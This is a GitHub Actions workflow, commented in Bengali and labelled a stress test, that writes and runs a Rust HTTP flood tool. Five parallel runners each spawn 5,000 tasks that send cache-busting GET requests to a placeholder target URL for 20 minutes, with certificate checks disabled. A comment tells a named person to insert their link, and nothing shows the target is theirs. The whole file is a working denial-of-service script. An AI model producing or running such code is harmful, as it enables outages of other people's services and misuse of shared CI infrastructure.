name: Vortex Matrix Final
on: 
  workflow_dispatch:

jobs:
  vortex-stress:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
        instance: [1, 2, 3, 4, 5] # ৫টি মেশিন একসাথে চলবে

    steps:
      - name: Checkout Code
        uses: actions/checkout@v3

      - name: Setup and Run
        run: |
          # ১. প্রজেক্ট তৈরি
          cargo new vortex_cloud --bin
          cd vortex_cloud
          
          # ২. লাইব্রেরি সেটআপ
          echo '[package]
          name = "vortex_cloud"
          version = "0.1.0"
          edition = "2021"
          [dependencies]
          tokio = { version = "1", features = ["full"] }
          reqwest = { version = "0.11", features = ["rustls-tls"] }
          rand = "0.8"' > Cargo.toml
          
          # ৩. মেইন কোড (একদম থ্রেড-সেফ ভার্সন)
          echo 'use reqwest::Client;
          use std::time::Duration;

          #[tokio::main]
          async fn main() {
              let target = "http://YOUR_TARGET_URL"; // জিহাদ, এখানে তোমার লিংক দাও
              let client = Client::builder()
                  .danger_accept_invalid_certs(true)
                  .build().unwrap();
              
              println!("🚀 Machine ${{ matrix.instance }} is Active!");
              
              let mut handles = vec![];
              for _ in 0..5000 {
                  let client_ref = client.clone();
                  let target_ref = target.to_string();
                  
                  handles.push(tokio::spawn(async move {
                      loop {
                          // thread_rng() বাদ দিয়ে সরাসরি random() ব্যবহার
                          let r: u64 = rand::random(); 
                          let url = format!("{}?vortex={}", target_ref, r);
                          let _ = client_ref.get(&url).send().await;
                      }
                  }));
              }
              // ২০ মিনিট পর অটো-স্টপ
              tokio::time::sleep(Duration::from_secs(1200)).await;
          }' > src/main.rs

          # ৪. কম্পাইল ও রান
          cargo run --release
